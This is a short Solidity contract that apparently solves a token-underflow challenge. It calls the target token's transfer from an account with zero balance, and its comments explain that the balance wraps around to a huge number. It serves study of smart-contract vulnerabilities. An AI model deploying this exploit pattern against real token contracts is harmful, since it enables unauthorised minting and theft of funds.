pragma solidity ^0.4.19;

import './Token.sol';

contract External {
    
    address public owner;
    Token public originalContract;
    
    function External() public {
    	originalContract = Token(/* CONTRACT ADDRESS */);
        owner = msg.sender;
    }
    
    function newTransfer(address _to, uint _value) public returns (bool) {
        originalContract.transfer(_to, _value);
        // this contract has a 0 balance
        // transfer whatever value and it'll be added onto the original 20
        // this contract will then have a balance of some very large positive number
    }
}